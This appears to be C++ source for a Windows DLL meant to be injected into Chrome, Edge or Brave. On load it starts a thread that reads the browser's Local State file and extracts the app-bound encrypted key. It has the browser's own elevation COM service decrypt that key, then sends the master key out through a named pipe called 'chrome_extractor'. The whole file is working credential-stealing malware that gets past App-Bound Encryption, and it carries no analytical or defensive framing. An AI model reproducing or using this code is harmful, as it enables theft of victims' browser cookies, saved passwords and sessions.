#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <vector>
#include <algorithm>
#include <wincrypt.h>
#include <shlobj.h>
#include <objbase.h>

enum class Browser { Chrome, Edge, Brave };

struct IElevatorVTbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(void*, const GUID*, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)(void*);
    ULONG(STDMETHODCALLTYPE* Release)(void*);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(void*, const wchar_t*, const wchar_t*, const wchar_t*, uint32_t, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(void*, uint32_t, BSTR, BSTR*, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(void*, BSTR, BSTR*, uint32_t*);
};

struct IEdgeElevatorVTbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(void*, const GUID*, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)(void*);
    ULONG(STDMETHODCALLTYPE* Release)(void*);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod1)(void*);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod2)(void*);
    HRESULT(STDMETHODCALLTYPE* EdgeBaseMethod3)(void*);
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(void*, const wchar_t*, const wchar_t*, const wchar_t*, uint32_t, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* EncryptData)(void*, uint32_t, BSTR, BSTR*, uint32_t*);
    HRESULT(STDMETHODCALLTYPE* DecryptData)(void*, BSTR, BSTR*, uint32_t*);
};

static const GUID CLSID_CHROME_ELEVATOR = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
static const GUID IID_CHROME_IELEVATOR1 = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };
static const GUID IID_CHROME_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38} };

static const GUID CLSID_EDGE_ELEVATOR = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
static const GUID IID_EDGE_IELEVATOR1 = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
static const GUID IID_EDGE_IELEVATOR2 = { 0x8F7B6792, 0x784D, 0x4047, {0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05} };

static const GUID CLSID_BRAVE_ELEVATOR = { 0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B} };
static const GUID IID_BRAVE_IELEVATOR1 = { 0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9} };
static const GUID IID_BRAVE_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, {0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38} };

static std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char>& encrypted_blob, Browser browser) {
    GUID clsid;
    std::vector<GUID> iids;
    if (browser == Browser::Chrome) { clsid = CLSID_CHROME_ELEVATOR; iids = { IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1 }; }
    else if (browser == Browser::Edge) { clsid = CLSID_EDGE_ELEVATOR; iids = { IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1 }; }
    else { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }

    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return {};

    void* elevator = nullptr;
    for (auto& iid : iids) {
        hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, &elevator);
        if (SUCCEEDED(hr)) break;
    }

    if (!elevator) { CoUninitialize(); return {}; }

    CoSetProxyBlanket((IUnknown*)elevator, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

    BSTR bstr_enc = SysAllocStringByteLen((const char*)encrypted_blob.data(), (unsigned int)encrypted_blob.size());
    BSTR bstr_dec = nullptr;
    uint32_t last_error = 0;

    if (browser == Browser::Edge) {
        auto vtable = *(IEdgeElevatorVTbl**)elevator;
        hr = vtable->DecryptData(elevator, bstr_enc, &bstr_dec, &last_error);
    } else {
        auto vtable = *(IElevatorVTbl**)elevator;
        hr = vtable->DecryptData(elevator, bstr_enc, &bstr_dec, &last_error);
    }

    std::vector<unsigned char> res;
    if (SUCCEEDED(hr) && bstr_dec) {
        res.assign((unsigned char*)bstr_dec, (unsigned char*)bstr_dec + SysStringByteLen(bstr_dec));
    }

    if (bstr_enc) SysFreeString(bstr_enc);
    if (bstr_dec) SysFreeString(bstr_dec);

    auto vtable = *(IElevatorVTbl**)elevator;
    vtable->Release(elevator);
    CoUninitialize();
    return res;
}

static std::vector<unsigned char> base64_decode(const std::string& s) {
    static const std::string b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<unsigned char> out; out.reserve(s.size() * 3 / 4);
    int val = 0, valb = -8;
    for (unsigned char c : s) {
        if (b64.find(c) == std::string::npos) break;
        val = (val << 6) + (int)b64.find(c);
        valb += 6;
        if (valb >= 0) { out.push_back(char((val >> valb) & 0xFF)); valb -= 8; }
    }
    return out;
}

static Browser get_browser() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    std::wstring s(path);
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    if (s.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
    if (s.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
    return Browser::Chrome;
}

static std::string read_file_win32(const wchar_t* path) {
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) return "";
    LARGE_INTEGER sz;
    if (!GetFileSizeEx(h, &sz) || sz.QuadPart == 0) { CloseHandle(h); return ""; }
    std::string data; data.resize((size_t)sz.QuadPart);
    DWORD read;
    if (!ReadFile(h, &data[0], (DWORD)sz.QuadPart, &read, nullptr)) { CloseHandle(h); return ""; }
    CloseHandle(h);
    return data;
}

static void do_work() {
    try {
        Browser browser = get_browser();
        wchar_t szPath[MAX_PATH];
        if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return;
        std::wstring data_path(szPath);

        if (browser == Browser::Chrome) data_path += L"\\Google\\Chrome\\User Data\\Local State";
        else if (browser == Browser::Edge) data_path += L"\\Microsoft\\Edge\\User Data\\Local State";
        else data_path += L"\\BraveSoftware\\Brave-Browser\\User Data\\Local State";

        std::string ls_str = read_file_win32(data_path.c_str());
        if (ls_str.empty()) return;

        size_t pos = ls_str.find("\"app_bound_encrypted_key\":\"");
        if (pos == std::string::npos) {
            pos = ls_str.find("\"os_crypt\":{");
            if (pos != std::string::npos) pos = ls_str.find("\"app_bound_encrypted_key\":\"", pos);
        }

        if (pos != std::string::npos) {
            pos += 27;
            size_t end = ls_str.find("\"", pos);
            if (end != std::string::npos) {
                std::string key_b64 = ls_str.substr(pos, end - pos);
                auto decoded = base64_decode(key_b64);
                if (decoded.empty()) return;
                std::vector<unsigned char> blob = (decoded.size() > 4 && std::string((char*)decoded.data(), 4) == "APPB") ? std::vector<unsigned char>(decoded.begin() + 4, decoded.end()) : decoded;
                auto v20_key = decrypt_with_elevator(blob, browser);

                if (!v20_key.empty()) {
                    HANDLE h_pipe = INVALID_HANDLE_VALUE;
                    for (int i = 0; i < 20; i++) {
                        h_pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
                        if (h_pipe != INVALID_HANDLE_VALUE) break;
                        Sleep(200);
                    }

                    if (h_pipe != INVALID_HANDLE_VALUE) {
                        DWORD written;
                        WriteFile(h_pipe, v20_key.data(), (DWORD)v20_key.size(), &written, nullptr);
                        FlushFileBuffers(h_pipe);
                        CloseHandle(h_pipe);
                    }
                }
            }
        }
    } catch (...) {}
}

static DWORD WINAPI thread_func(LPVOID) {
    do_work();
    return 0;
}

extern "C" BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        std::wstring cmd = GetCommandLineW();
        // Only run in the main process, not in utility or renderer processes
        if (cmd.find(L"--type=") == std::wstring::npos) {
            HANDLE hThread = CreateThread(NULL, 0, thread_func, NULL, 0, NULL);
            if (hThread) CloseHandle(hThread);
        }
    }
    return TRUE;
}
